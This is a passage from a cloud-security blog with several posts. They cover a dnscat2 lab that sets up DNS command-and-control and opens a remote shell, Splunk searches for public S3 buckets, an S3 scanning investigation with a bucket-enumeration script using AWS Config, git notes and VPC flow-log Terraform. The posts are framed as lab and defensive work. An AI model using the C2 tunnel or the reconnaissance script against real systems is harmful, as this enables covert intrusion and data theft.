tunnel that WON\u0026rsquo;T make you sick and kill you!\nThis tool is designed to create an encrypted command-and-control (C\u0026amp;C) channel over the DNS protocol, which is an effective tunnel out of almost every network.\nEven though instrutions to setup dnscat2 are pretty straightforward, I came across several error messages while trying to make it work. Leaving my notes here for my future self and for everyone esle who is trying to play around with this tool. We will be making use of two AWS acounts, one for client and other for server and configurations can be found below:\ndnscat2 comes in two parts: the client and the server.\nThe client is designed to be run on a compromised machine. It\u0026rsquo;s written in C and has the minimum possible dependencies. It should run just about anywhere.\nServer Setup For all the EC2 instances, we will be using the Ubuntu AMI (Amazon Machine Image). The server isn\u0026rsquo;t \u0026ldquo;compiled\u0026rdquo;, as such, but it does require some Ruby dependencies.\n$ sudo apt-get update $ git clone https://github.com/iagox86/dnscat2.git $ cd dnscat2/server/ $ sudo apt-get install build-essential $ sudo apt-get install ruby $ sudo apt-get install ruby-dev $ sudo gem install bundler $ bundle install On Server, you can verify dnscat2 is successfully compiled by running it with no flags; you\u0026rsquo;ll see it attempting to start a DNS tunnel with whatever your configured DNS server is (which will fail):\nubuntu@ip-172-31-33-167:~/dnscat2/server$ sudo systemctl stop systemd-resolved ubuntu@ip-172-31-33-167:~/dnscat2/server$ sudo ruby ./dnscat2.rb sudo: unable to resolve host ip-172-31-90-81: Resource temporarily unavailable New window created: 0 New window created: crypto-debug Welcome to dnscat2! Some documentation may be out of date. auto_attach =\u0026gt; false history_size (for new windows) =\u0026gt; 1000 Security policy changed: All connections must be encrypted New window created: dns1 Starting Dnscat2 DNS server on 0.0.0.0:53 [domains = n/a]... It looks like you didn\u0026#39;t give me any domains to recognize! That\u0026#39;s cool, though, you can still use direct queries, although those are less stealthy. To talk directly to the server without a domain name, run: ./dnscat --dns server=x.x.x.x,port=53 --secret=6190b0ad9dff0d1483d89fcfa869ab60 Of course, you have to figure out \u0026lt;server\u0026gt; yourself! Clients will connect directly on UDP port 53. dnscat2\u0026gt; Client Setup Build and run dnscat2 client on bastion host machine\n./dnscat \u0026ndash;dns server=x.x.x.x,port=53 \u0026ndash;secret=6190b0ad9dff0d1483d89fcfa869ab60\nReplace the x.x.x.x with the public IP of the DNS Server\u0026rsquo;s EC2 instance.\nubuntu@@ip-172-31-33-167::~/dnscat2/client$ ./dnscat --dns server=18.212.67.90,port=53 --secret=6190b0ad9dff0d1483d89fcfa869ab60 Creating DNS driver: domain = (null) host = 0.0.0.0 port = 53 type = TXT,CNAME,MX server = 18.212.67.90 ** Peer verified with pre-shared secret! Session established! We\u0026rsquo;ll use the window command to interact with 1, where we run the shell command to get access to shell for the DNS client.\ndnscat2\u0026gt; windows 0 :: main [active] crypto-debug :: Debug window for crypto stuff [*] dns1 :: DNS Driver running on 0.0.0.0:53 domains = [*] dnscat2\u0026gt; window -i 1 Window 1 not found! 0 :: main [active] crypto-debug :: Debug window for crypto stuff [*] dns1 :: DNS Driver running on 0.0.0.0:53 domains = [*] dnscat2\u0026gt; Can\u0026#39;t close the main window! New window created: 1 Session 1 Security: ENCRYPTED AND VERIFIED! (the security depends on the strength of your pre-shared secret!) dnscat2\u0026gt; windows 0 :: main [active] crypto-debug :: Debug window for crypto stuff [*] dns1 :: DNS Driver running on 0.0.0.0:53 domains = [*] 1 :: command (ip-172-31-33-167) [encrypted and verified] [*] dnscat2\u0026gt; window -i 1 New window created: 1 history_size (session) =\u0026gt; 1000 Session 1 Security: ENCRYPTED AND VERIFIED! (the security depends on the strength of your pre-shared secret!) This is a command session! That means you can enter a dnscat2 command such as \u0026#39;ping\u0026#39;! For a full list of clients, try \u0026#39;help\u0026#39;. command (ip-172-31-33-167) 1\u0026gt; shell Sent request to execute a shell command (ip-172-31-33-167) 1\u0026gt; New window created: 2 Shell session created! To escape this, you can use ctrl-z and switch to window 2 to access the shell session:\ndnscat2\u0026gt; windows 0 :: main [active] crypto-debug :: Debug window for crypto stuff [*] dns1 :: DNS Driver running on 0.0.0.0:53 domains = [*] 1 :: command (ip-172-31-33-167) [encrypted and verified] [*] [idle for 126 seconds] 2 :: sh (ip-172-31-33-167) [encrypted and verified] [idle for 126 seconds] dnscat2\u0026gt; window -i 2 New window created: 2 history_size (session) =\u0026gt; 1000 Session 2 Security: ENCRYPTED AND VERIFIED! (the security depends on the strength of your pre-shared secret!) This is a console session! That means that anything you type will be sent as-is to the client, and anything they type will be displayed as-is on the screen! If the client is executing a command and you don\u0026#39;t see a prompt, try typing \u0026#39;pwd\u0026#39; or something! To go back, type ctrl-z. sh (ip-172-31-33-167) 4\u0026gt; pwd sh (ip-172-31-33-167) 4\u0026gt; /home/ubuntu/dnscat2/client How to defend against C2 tunneling over DNS? Limit the number of DNS servers that systems on your network are allowed to reach to not only complicate the adversary’s tunneling setup, but also to limit the types of DNS interactions you need to oversee. If possible, direct DNS activities through a set of DNS servers that you control, so you can keep an eye on them and tweak there configuration when necessary. Monitor DNS activities for anomalies, looking at DNS server or network logs. The use of DNS for C2 tends to exhibit timing and payload deviations that might allow you to spot misuse. References https://github.com/iagox86/dnscat2 https://dejandayoff.com/using-dns-to-break-out-of-isolated-networks-in-a-aws-cloud-environment/ https://www.sans.org/reading-room/whitepapers/dns/paper/34152 ","permalink":"https://www.logsec.cloud/posts/dnscat2-demo-on-aws/","summary":"No matter how tightly you restrict outbound access from your network, you probably allow DNS protocol to at least one server. Adversaries can abuse this access in your firewall to establish stealthy Command and Control (C2) channels or to exfiltrate data that is difficult to block. To understand the use of DNS for C2 tunneling, let’s take a look at Ron Bowes’s tool dnscat2, which makes it relatively easy to experiment with such attack techniques.","title":"dnscat2: Command and Control over the DNS"},{"content":"In today\u0026rsquo;s post, we will learn how to detect a public S3 bucket using Splunk. Later, we will see how we can respond to such incidents and even prevent it from happening in the first place. As you will see in the following examples, there are multiple ways to create a S3 bucket and make it public. Also, for this blog, I created some subdomains of logsec.cloud in Route53.\nScenario 1: Using the AWS Web Console Create a S3 bucket and Go to \u0026ldquo;Permissions\u0026rdquo; - \u0026ldquo;Access Control List\u0026rdquo; - \u0026ldquo;Public Access\u0026rdquo; - \u0026ldquo;Everyone\u0026rdquo; - Access to the objects -\nList Objects [*]: Allows Gurantee to list the objects in the bucket Write Objects [*]: Allows Gurantee to create and delete the objects in the bucket Go to \u0026ldquo;Permissions\u0026rdquo; - \u0026ldquo;Access Control List\u0026rdquo; - \u0026ldquo;Public Access\u0026rdquo; - \u0026ldquo;Everyone\u0026rdquo; - Access to this bucket\u0026rsquo;s ACL -\nRead bucket permissions: Allow Gurantee to read the bucket ACL Write bucket permissions: Allow Gurantee to edit the bucket ACL To detect the first two scenarios, below Splunk search will work:\nindex=\u0026#34;*\u0026#34; sourcetype=\u0026#34;aws:cloudtrail\u0026#34;eventName=CreateBucket OR eventName=PutBucketAcl OR eventName=PutObjectAcl requestParameters.AccessControlPolicy.AccessControlList.Grant{}.Grantee.URI=\u0026#34;http://acs.amazonaws.com/groups/global/AllUsers\u0026#34; OR requestParameters.AccessControlPolicy.AccessControlList.Grant{}.Grantee.URI=\u0026#34;http://acs.amazonaws.com/groups/global/AuthenticatedUsers\u0026#34; | rename requestParameters.AccessControlPolicy.Owner.DisplayName as bucketOwner | eval time=strftime(_time,\u0026#34;%c %p\u0026#34;)\r| stats values(time) values(eventSource) values(eventName) values(eventType) values(errorCode) values(requestParameters.bucketName) values(bucketOwner) values(sourceIPAddress) values(userIdentity.arn) values(userIdentity.type) values(awsRegion) values(userIdentity.accountId) values(index) Scenario 2: Using the AWS CLI to create a bucket with a public-read policy: $ aws s3api create-bucket --acl public-read --bucket BUCKET_NAME --region us-east-1 Other Possible values are: [CANNED ACLs]\nprivate public-read public-read-write authenticated-read Reference: Create-Bucket\nTesting the value: authenticated-read: Add the \u0026ldquo;Any AWS User\u0026rdquo; under the Public Access. Even though this option to add Authenticated User is now removed from the AWS Console, but you can still use it using the AWS CLI.\nSPL:\n\u0026#34;requestParameters.x-amz-acl{}\u0026#34;=\u0026#34;public-*\u0026#34; To detect both values:\npublic-read public-read-write aws s3api create-bucket --acl authenticated-read --bucket BUCKET_NAME --region us-east-1 SPL:\n\u0026#34;requestParameters.x-amz-acl{}\u0026#34;=\u0026#34;authenticated-read\u0026#34; Combining the events under Scenario 2, SPL will look like this:\nindex=\u0026#34;*\u0026#34; sourcetype=\u0026#34;aws:cloudtrail\u0026#34; eventName=CreateBucket OR eventName=\u0026#34;Put*Acl\u0026#34; \u0026#34;requestParameters.x-amz-acl{}\u0026#34;=\u0026#34;public-*\u0026#34; OR \u0026#34;requestParameters.x-amz-acl{}\u0026#34;=\u0026#34;authenticated-read\u0026#34; | eval time=strftime(_time,\u0026#34;%c %p\u0026#34;)\r| stats values(time) values(eventSource) values(eventName) values(eventType) values(errorCode) values(requestParameters.bucketName) values(bucketOwner) values(sourceIPAddress) values(userIdentity.arn) values(userIdentity.type) values(awsRegion) values(userIdentity.accountId) values(index) Scenario 3: Another option to make an S3 bucket public: by specifying the Grant ACP permissions via the command line CLI Command used:\naws s3api create-bucket --bucket BUCKET_NAME --region us-east-1 --grant-write-acp uri=\u0026#34;http://acs.amazonaws.com/groups/global/AllUsers\u0026#34; [--grant-full-control \u0026lt;value\u0026gt;] [--grant-read \u0026lt;value\u0026gt;] [--grant-read-acp \u0026lt;value\u0026gt;] [--grant-write \u0026lt;value\u0026gt;]- [--grant-write-acp \u0026lt;value\u0026gt;] Here value could be either \u0026ldquo;http://acs.amazonaws.com/groups/global/AuthenticatedUsers\u0026quot; OR \u0026ldquo;http://acs.amazonaws.com/groups/global/AllUsers\u0026quot;\nReference:\nUsing API-Level (s3api) commands with the AWS CLI\nSPL:\neventName=CreateBucket requestParameters.x-amz-grant-read{}=\u0026#34;uri=http://acs.amazonaws.com/groups/global/AllUsers\u0026#34; Combining all the posible values, SPL will look like:\n(requestParameters.x-amz-grant-full-control{}=\u0026#34;*AllUsers\u0026#34; OR requestParameters.x-amz-grant-full-control{}=\u0026#34;*AuthenticatedUsers\u0026#34;)\r(requestParameters.x-amz-grant-read{}=\u0026#34;*AllUsers\u0026#34; OR requestParameters.x-amz-grant-read{}=\u0026#34;*AuthenticatedUsers\u0026#34;) OR\r(requestParameters.x-amz-grant-read-acp{}=\u0026#34;*AllUsers\u0026#34; OR requestParameters.x-amz-grant-read-acp{}=\u0026#34;*AuthenticatedUsers\u0026#34;) OR\r(requestParameters.x-amz-grant-write{}=\u0026#34;*AllUsers\u0026#34; OR requestParameters.x-amz-grant-write{}=\u0026#34;*AuthenticatedUsers\u0026#34;) OR\r(requestParameters.x-amz-grant-write-acp{}=\u0026#34;*AllUsers\u0026#34; OR requestParameters.x-amz-grant-write-acp{}=\u0026#34;*AuthenticatedUsers\u0026#34;) Consolidatig all the above searches, to detect all possible scenarios, our complete search will be:\nindex=\u0026#34;*\u0026#34; sourcetype=\u0026#34;aws:cloudtrail\u0026#34; eventName=CreateBucket OR eventName=\u0026#34;Put*Acl\u0026#34; (\u0026#34;requestParameters.AccessControlPolicy.AccessControlList.Grant{}.Grantee.URI\u0026#34;=\u0026#34;http://acs.amazonaws.com/groups/global/AllUsers\u0026#34;) OR (requestParameters.x-amz-grant-full-control{}=\u0026#34;*AllUsers\u0026#34; OR requestParameters.x-amz-grant-full-control{}=\u0026#34;*AuthenticatedUsers\u0026#34;) OR\r(requestParameters.x-amz-grant-read{}=\u0026#34;*AllUsers\u0026#34; OR requestParameters.x-amz-grant-read{}=\u0026#34;*AuthenticatedUsers\u0026#34;) OR\r(requestParameters.x-amz-grant-read-acp{}=\u0026#34;*AllUsers\u0026#34; OR requestParameters.x-amz-grant-read-acp{}=\u0026#34;*AuthenticatedUsers\u0026#34;) OR\r(requestParameters.x-amz-grant-write{}=\u0026#34;*AllUsers\u0026#34; OR requestParameters.x-amz-grant-write{}=\u0026#34;*AuthenticatedUsers\u0026#34;) OR\r(requestParameters.x-amz-grant-write-acp{}=\u0026#34;*AllUsers\u0026#34; OR requestParameters.x-amz-grant-write-acp{}=\u0026#34;*AuthenticatedUsers\u0026#34;) | eval time=strftime(_time,\u0026#34;%c %p\u0026#34;)\r| stats values(time) values(eventSource) values(eventName) values(eventType) values(errorCode) values(requestParameters.bucketName) values(bucketOwner) values(sourceIPAddress) values(userIdentity.arn) values(userIdentity.type) values(awsRegion) values(userIdentity.accountId) values(index) If you are importing the S3 Server Access Logs in to Splunk, you can use geostats command to generate statistics to display geographic data and summarize the data on maps.\nindex=\u0026#34;*\u0026#34; sourcetype=\u0026#34;aws:s3:accesslogs\u0026#34; | iplocation remote_ip\r| geostats count BY remote_ip Known false positives: There could be undesired alerts that can occur from this search, when someone intentionally creates a public bucket. In this case, consider adding speicific buckets to whitelist.\nHow to respond: When this alert fires, ask yourself these questions. Is it still public? This is easy to detect, just search the logs for the bucket name and PutBucketACL, to see any subsequent ACL changes. Are the files public? and What is in it? These can be detected using S3 Access logs.\nHow to prevent: Configure S3 Block Public Access on the AWS account level (applies to all S3 buckets in all regions). S3 Block Public Access provides four settings:\nBlock Public ACLs: Prevent any new operations to make buckets or objects public through Bucket or Object ACLs. (existing policies and ACLs for buckets and objects are not modified.) Ignore Public ACLs: Ignore all public ACLs on a bucket and any objects that it contains Block Public Policy: Reject calls to PUT Bucket policy if the specified bucket policy allows public access. (Enabling this setting doesn\u0026rsquo;t affect existing bucket policies) Restrict Public Buckets: Restrict access to a bucket with a public policy to only AWS services and authorized users within the bucket owner\u0026rsquo;s account. provider \u0026#34;aws\u0026#34; { } resource \u0026#34;aws_s3_account_public_access_block\u0026#34; \u0026#34;BlockPublicAccess\u0026#34; { block_public_acls = \u0026#34;true\u0026#34; ignore_public_acls = \u0026#34;true\u0026#34; block_public_policy = \u0026#34;true\u0026#34; restrict_public_buckets = \u0026#34;true\u0026#34; } ","permalink":"https://www.logsec.cloud/posts/detect-public-s3-bucket-using-splunk/","summary":"In today\u0026rsquo;s post, we will learn how to detect a public S3 bucket using Splunk. Later, we will see how we can respond to such incidents and even prevent it from happening in the first place. As you will see in the following examples, there are multiple ways to create a S3 bucket and make it public. Also, for this blog, I created some subdomains of logsec.cloud in Route53.\nScenario 1: Using the AWS Web Console Create a S3 bucket and Go to \u0026ldquo;Permissions\u0026rdquo; - \u0026ldquo;Access Control List\u0026rdquo; - \u0026ldquo;Public Access\u0026rdquo; - \u0026ldquo;Everyone\u0026rdquo; - Access to the objects -","title":"Detect Public S3 Bucket using Splunk"},{"content":"During the past week, we detected some suspicious activities across multiple AWS accounts in one of our client\u0026rsquo;s environment. These activites seems related to scanning activities from a bad actor on S3 buckets. One of the sample logs from S3 Access logs:\n84fd7086179626a759fb59a0252a26d26dc1685e30f0ab922266b5abace8f998 \u0026lt;AWS-ACCOUNT-ID\u0026gt;-config-org-bucket [01/Jun/2020:13:27:34 +0000] 10.247.13.187 arn:aws:iam::799199334739:user/starling-ladyblackhawk-iad-prod 9WDX6MBZFQ6Z6RDR REST.HEAD.BUCKET - \u0026#34;HEAD / HTTP/1.1\u0026#34; 403 AccessDenied 243 - 9 - \u0026#34;-\u0026#34; \u0026#34;AWSConfig\u0026#34; - wFvPfIaSbdpcnNMdcTj+BNWn00r3OfqHV8sTt8gUXMzLA7O/MiWg+NPckix2TThK15V/p1JigVc= SigV4 ECDHE-RSA-AES128-SHA AuthHeader \u0026lt;AWS-ACCOUNT-ID\u0026gt;-config-org-bucket.s3.amazonaws.com TLSv1.2 First thing that got our attention to this specific log is the username starling-ladyblack-iad-prod, question to ask at this stage is this a rouge IAM user? We do not follow such naming convention across the organization. Second, looking at the AWS account id 799199334739 - this account does not belongs to us. So, definitely this is not a rougue user in our environement.\nNext, extending the date time range in Splunk used the below search to look for http_status other than 403. Fortunantely, there were no 200, but these activities were continuous from last couple of months.\nindex=\u0026#34;aws\u0026#34; sourcetype=\u0026#34;aws:s3:accesslogs\u0026#34;\r| table error_code http_status operation bucket_name remote_ip requester request_uri user_agent index Other interesting thing to notice in the S3 access logs is the user agent is AWSConfig and remote IP is private. When we access S3 bucket using AWS CLI, remote IP is the public IP of the user machine. But in this case, it was private. To gather more inforamtion about this behavior, search for S3 access logs format. As per AWS documentation:\nRemote IP: The apparent internet address of the requester. Intermediate proxies and firewalls might obscure the actual address of the machine making the request.\nNext step was to determine the reason behind user agent AWS Config. Is this some kind of misconfiguration on someone\u0026rsquo;s AWS account or someone trying to manipulate the user Agent or maybe event using AWS config for these scanning activities? To answer these questions, I tried to replicate the same behaviour using AWS Config in our learning environment.\nIn Account A, created two S3 buckets named AWS-ACCOUNT-ID-config-org-bucket and AWS-ACCOUNT-ID-s3-access-logs. Turned on the Server access logging for first bucket and selected second bucket as the target. Block public access flag is enabled on account level to ensure that public access to all S3 buckets and objects is blocked. Refer to Using Amazon S3 block public access.\nIn Account B, Turned ON the recording under Settings for AWS Config as shown in diagram below, it works when we select an S3 buckets that exists and have the proper permissions. You can look for the correct permissions at S3 bucket policy.\nBut when we attempt to select a bucket AWS-ACCOUNT-ID-config-org-bucket from account A that does not exist or not have the correct bucket policy, it throws an error:\nNext, log in to Splunk and looked in to investigate S3 access logs for AWS-ACCOUNT-ID-s3-access-logs in account A. Using the same search we used earlier, found out a similar pattern in the S3 access logs:\n84fd7086179626a759fb59a0252a26d26dc1685e30f0ab922266b5abace8f998 \u0026lt;AWS-ACCOUNT-ID\u0026gt;-config-org-bucket [03/Jun/2020:03:12:08 +0000] 10.247.239.161 arn:aws:sts::xxxxxxxxxxxx:assumed-role/account/AWSConfig-Describe 944A6758900290DD REST.GET.ACCELERATE - \u0026#34;GET /?accelerate HTTP/1.1\u0026#34; 200 - 113 - 10 - \u0026#34;-\u0026#34; \u0026#34;AWSConfig\u0026#34; - joUWdNULBFcczofcQ4HDKGOMGCSy4mCVeAh/oc66yuelKFYnazB6dftz2d6c91GXfZRqtNNmXCc= SigV4 ECDHE-RSA-AES128-SHA AuthHeader \u0026lt;AWS-ACCOUNT-ID\u0026gt;-config-org-bucket.s3.us-east-1.amazonaws.com TLSv1.2 As this log is similar to what we have seen in the client\u0026rsquo;s environment, we can be sure, either someone misconfigured their AWS Config Amazon S3 Bucket setting to write their logs to our bucket or using this to determine if a particular S3 buckets exisits or not. Also, now we are confident regarding the user agent as AWS Config and remote IP is a private IP, which is based on VPC CIDR range from Account B.\nTo take this a step further, we tried to write a script to test if a potential hacker can use this for malicious purposes - like reconnaissance activites for S3 buckets. Please note there are various tools available to validate S3 buckets like https://github.com/dagrz/aws_pwn, but I\u0026rsquo;m not able to find anything using AWS Config.\nBelow script takes two inputs, -i for text file with bucket names like bucket_names.txt (one word per line) and -o to output the results in to a file in a json format, like output.json. Replace the Role_ARN with the IAM Role ARN you want to use for AWS Config.\nmaven@pluto:~$ ./config.py -h usage: config.py [-h] -i INPUT_FILE [-o OUTPUT_FILE] Validate existence of a S3 bucket. optional arguments: -h, --help show this help message and exit -i INPUT_FILE, --input-file INPUT_FILE -o OUTPUT_FILE, --output-file OUTPUT_FILE Example:\nmaven@pluto:~$ ./config.py -i bucket_names.txt -o output.json #!/usr/bin/env python3 import boto3 import json import argparse def main(args): role_arn = \u0026#34;ROLE_ARN\u0026#34; all_results = [] for line in args.input_file.readlines(): line = line.strip() if(line and not line.startswith(\u0026#39;#\u0026#39;)): result = validate_s3_bucket(line, role_arn) all_results.append(result) print(\u0026#34;Bucket: %s\u0026#34; % line) print(json.dumps(result, indent=2)) print(\u0026#34;#\u0026#34; * 10) args.input_file.close() if(args.output_file is not None): args.output_file.write(json.dumps(all_results, indent=2)) args.output_file.close() def validate_s3_bucket(bucket_name, role_arn): config_client = boto3.client(\u0026#39;config\u0026#39;, region_name=\u0026#39;us-east-1\u0026#39;) response = config_client.start_configuration_recorder( ConfigurationRecorderName=\u0026#39;default\u0026#39; ) response = config_client.put_configuration_recorder( ConfigurationRecorder={ \u0026#39;name\u0026#39;: \u0026#39;default\u0026#39;, \u0026#39;recordingGroup\u0026#39;: { \u0026#39;allSupported\u0026#39;: True, \u0026#39;includeGlobalResourceTypes\u0026#39;: True }, \u0026#39;roleARN\u0026#39;: role_arn } ) try: result = config_client.put_delivery_channel( DeliveryChannel={ \u0026#39;name\u0026#39;: \u0026#39;default\u0026#39;, \u0026#39;s3BucketName\u0026#39;: bucket_name } ) except config_client.exceptions.InsufficientDeliveryPolicyException as e: result = ( \u0026#34;Your Amazon S3 bucket policy does not permit AWS Config to write to it.: %s\u0026#34; % e) except config_client.exceptions.NoSuchBucketException as e: result = (\u0026#34;The specified Amazon S3 bucket does not exist.: %s\u0026#34; % e) except ClientError as e: result = (\u0026#34;Unexpected error: %s\u0026#34; % e) return result if __name__ == \u0026#39;__main__\u0026#39;: parser = argparse.ArgumentParser( description=\u0026#34;Validate existence of a S3 bucket.\u0026#34;) parser.add_argument(\u0026#39;-i\u0026#39;, \u0026#39;--input-file\u0026#39;, type=argparse.FileType(\u0026#39;r\u0026#39;), required=True) parser.add_argument(\u0026#39;-o\u0026#39;, \u0026#39;--output-file\u0026#39;, type=argparse.FileType(\u0026#39;w\u0026#39;)) args = parser.parse_args() main(args) While testing in our learning environment, found another similar user from same AWS Account arn:aws:iam::799199334739:user/starling-dove-iad-prod. As of now, we\u0026rsquo;re seeing these two different IAM users from the same AWS Account 799199334739. As of now, not sure who is the actual owner of this account or this account belongs to AWS itself. To be continued\u0026hellip;\nindex=\u0026#34;aws\u0026#34; sourcetype=\u0026#34;aws:s3:accesslogs\u0026#34; requester=\u0026#34;arn:aws:iam::*:user/starling-*\u0026#34; | stats count BY requester ","permalink":"https://www.logsec.cloud/posts/investigating-on-aws/","summary":"During the past week, we detected some suspicious activities across multiple AWS accounts in one of our client\u0026rsquo;s environment. These activites seems related to scanning activities from a bad actor on S3 buckets. One of the sample logs from S3 Access logs:\n84fd7086179626a759fb59a0252a26d26dc1685e30f0ab922266b5abace8f998 \u0026lt;AWS-ACCOUNT-ID\u0026gt;-config-org-bucket [01/Jun/2020:13:27:34 +0000] 10.247.13.187 arn:aws:iam::799199334739:user/starling-ladyblackhawk-iad-prod 9WDX6MBZFQ6Z6RDR REST.HEAD.BUCKET - \u0026#34;HEAD / HTTP/1.1\u0026#34; 403 AccessDenied 243 - 9 - \u0026#34;-\u0026#34; \u0026#34;AWSConfig\u0026#34; - wFvPfIaSbdpcnNMdcTj+BNWn00r3OfqHV8sTt8gUXMzLA7O/MiWg+NPckix2TThK15V/p1JigVc= SigV4 ECDHE-RSA-AES128-SHA AuthHeader \u0026lt;AWS-ACCOUNT-ID\u0026gt;-config-org-bucket.s3.amazonaws.com TLSv1.2 First thing that got our attention to this specific log is the username starling-ladyblack-iad-prod, question to ask at this stage is this a rouge IAM user?","title":"Investigating S3 Scanning Activites on AWS"},{"content":"Git is a version control system. Basically, if someone changes a file (like opens a document and writes stuff in it, changes a line of code, or so on) it records the differences between the new version and the old version, and maintains a history. This allows people to preserve differing versions, go back in time to earlier ones, review changes as they have occurred over time, and so on.\nWhat is it? VCS - Version Control System Snapshots, not differences, nor deltas Series of snapshots of a tiny filesystem Every commit is a new snapshot\nno changes no new file stored Everything is local\nOffline! Every file is checksummed! Why git? Everything is code\nFile syncing\nVersion history of text files\nDevOps\nConfiguration as Code\nInfrastructure as Code\nGitHub freebies Markdown is rendered\nMarkdown just works well in git\nGitHub Pages offers free static hosting and CMS\nor old school text files are fine too\nHow git? make files\nadd commit push Git Cheat Sheet: https://education.github.com/git-cheat-sheet-education.pdf\nYou will mess up It\u0026rsquo;s ok It\u0026rsquo;s all just files anyway ohshitgit.com keep notes of git commands cd ../ rm -rf my-git-repo git clone https://github.com/myuser/my-git-repo.git Git branching Everyone always uses master don\u0026rsquo;t lazy/bad habit You aren\u0026rsquo;t sole contributor Feature branches\nYour \u0026lsquo;Changeset\u0026rsquo; is a branch Then commit, push/merge, PR order in the chaos Simple workflow Pull from master git branch harwinder git checkout harwinder change files git commit -a -m \u0026#34;my message\u0026#34; git push origin harwinder; #my branch open pull request Commit messages Re-establishing the context of a piece of code is wasteful We can\u0026rsquo;t avoid it completely, so our efforts go to reducing it as much as possible Commit Messages can do exactly that \u0026amp; as a result, a commit message shows whether a developer is a good collaborator Commit squashing squash before PR Cleaner Rewrite bad commit messages Protect yourself from yourself restrict master .gitignore: a collection of useful .gitignore templates https://github.com/github/gitignore git-secrets: Prevents you from committing secrets and credentials into git repositories https://github.com/awslabs/git-secrets after the fact BFG Repo-Cleaner:Removes large or troublesome blobs like git-filter-branch does, but faster https://rtyley.github.io/bfg-repo-cleaner ","permalink":"https://www.logsec.cloud/posts/git-notes/","summary":"Git is a version control system. Basically, if someone changes a file (like opens a document and writes stuff in it, changes a line of code, or so on) it records the differences between the new version and the old version, and maintains a history. This allows people to preserve differing versions, go back in time to earlier ones, review changes as they have occurred over time, and so on.","title":"Git Notes"},{"content":"In this blog post, we will learn how to ingest VPC flow logs with additional meta-data to Splunk. We will start by creating a VPC flow logs using terraform and pushing the logs to S3. From S3 ingesting these logs to Splunk using Amazon Kinesis. At last, we will make some changes to Splunk\u0026rsquo;s profs.conf file for correct field extraction for the additional VPC flow log fields.\nAll Terraform files are available to download at my GitHub Repo. You just need to edit the terraform.tfvars file and put your AWS ACCESS KEY ID and SECRET ACCESS KEY.\nmaven@pluto:~$ tree ./terraform/ ./terraform/ ├── cloudtrail.tf ├── module.tf ├── output.tf ├── provider.tf ├── splunk │ ├── instance_splunk.tf │ ├── splunk_iam_role.tf │ ├── splunk_iam_role_pol.json │ ├── user_data_splunk.sh | ├── sqs_vpc_flow_logs.tf │ ├── variables.tf | ├── vpc_flow_log.tf │ └── vpc_splunk.tf ├── sqs_cloudtrail_logs.tf ├── terraform.tfvars ├── variables.tf └── versions.tf In our previous post, we setup a Splunk environment on AWS using Splunk Enterprise. To the same exisitng infrastructure, we added few things to achieve our today\u0026rsquo;s task. Terrafrom file vpc_flow_log.tf and sqs_vpc_flow_logs.tf in addition to our earlier AWS infrastructure.\nCreate a VPC Flow log for the existing Splunk VPC VPC Flow Logs is a feature that enables you to capture information about the IP traffic going to and from network interfaces in your VPC.\nDefault VPC Flow Log format\n\u0026lt;version\u0026gt; \u0026lt;account-id\u0026gt; \u0026lt;interface-id\u0026gt; \u0026lt;srcaddr\u0026gt; \u0026lt;dstaddr\u0026gt; \u0026lt;srcport\u0026gt; \u0026lt;dstport\u0026gt; \u0026lt;protocol\u0026gt; \u0026lt;packets\u0026gt; \u0026lt;bytes\u0026gt; \u0026lt;start\u0026gt; \u0026lt;end\u0026gt; \u0026lt;action\u0026gt; \u0026lt;log-status\u0026gt; But we will creating a custom format for the flow log record using additonal meta-data fields. This helps us to create flow logs that are specific to our needs, you can add or omit the fields based on your requirements. We will be adding all the available fields for this demo. Additonal fields like instance-id makes an analyst\u0026rsquo;s life much easier during investigation to find the actual source, instead of just relying on srcaddr, as EC2 instances are ephermal in nature, source address/private IP address can later be assigned to a different instance.\n\u0026lt;version\u0026gt; \u0026lt;vpc-id\u0026gt; \u0026lt;subnet-id\u0026gt; \u0026lt;instance-id\u0026gt; \u0026lt;interface-id\u0026gt; \u0026lt;account-id\u0026gt; \u0026lt;type\u0026gt; \u0026lt;srcaddr\u0026gt; \u0026lt;dstaddr\u0026gt; \u0026lt;srcport\u0026gt; \u0026lt;dstport\u0026gt; \u0026lt;pkt-srcaddr\u0026gt; \u0026lt;pkt-dstaddr\u0026gt; \u0026lt;protocol\u0026gt; \u0026lt;bytes\u0026gt; \u0026lt;packets\u0026gt; \u0026lt;start\u0026gt; \u0026lt;end\u0026gt; \u0026lt;action\u0026gt; \u0026lt;tcp-flags\u0026gt; \u0026lt;log-status\u0026gt; # Flow Logs for the Splunk VPC resource \u0026#34;aws_flow_log\u0026#34; \u0026#34;splunk_vpc_flow_log\u0026#34; { log_destination = aws_s3_bucket.flow_log_bucket.arn log_destination_type = \u0026#34;s3\u0026#34; traffic_type = \u0026#34;ALL\u0026#34; vpc_id = aws_vpc.splunk_vpc.id log_format = \u0026#34;$${version} $${vpc-id} $${subnet-id} $${instance-id} $${interface-id} $${account-id} $${type} $${srcaddr} $${dstaddr} $${srcport} $${dstport} $${pkt-srcaddr} $${pkt-dstaddr} $${protocol} $${bytes} $${packets} $${start} $${end} $${action} $${tcp-flags} $${log-status}\u0026#34; max_aggregation_interval = \u0026#34;600\u0026#34; } Please note, a resource-based policy will be created for you and attached to the target bucket.\nCreate an Amazon S3 bucket for our VPC Flow Logs. # S3 bucket for VPC Flow logs resource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;flow_log_bucket\u0026#34; { bucket = \u0026#34;${var.account_id}-lab-vpc-flow-logs\u0026#34; } output \u0026#34;splunk_vpc_log_id\u0026#34; { description = \u0026#34;The Flow Log ID\u0026#34; value = aws_flow_log.splunk_vpc_flow_log.id } Create two SQS Queues. Now it\u0026rsquo;s time to create the SQS queues. Two queues will be required. One queue will be the dead letter queue for error messages to be kicked over to and the other will be the queue used to capture the S3 notifications when a new VPC Flow Log event is sent to the S3 bucket we created in earlier step.\n# Add Amazon S3 Event Notification configuration to SQS Queue resource \u0026#34;aws_sqs_queue\u0026#34; \u0026#34;queue_flow_logs\u0026#34; { name = \u0026#34;s3_event_notification_queue_flow_logs\u0026#34; visibility_timeout_seconds = 300 redrive_policy = jsonencode({ deadLetterTargetArn = aws_sqs_queue.dl_queue_flow_logs.arn maxReceiveCount = 1 }) policy = \u0026lt;\u0026lt;POLICY { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Principal\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;sqs:SendMessage\u0026#34;, \u0026#34;Resource\u0026#34;: 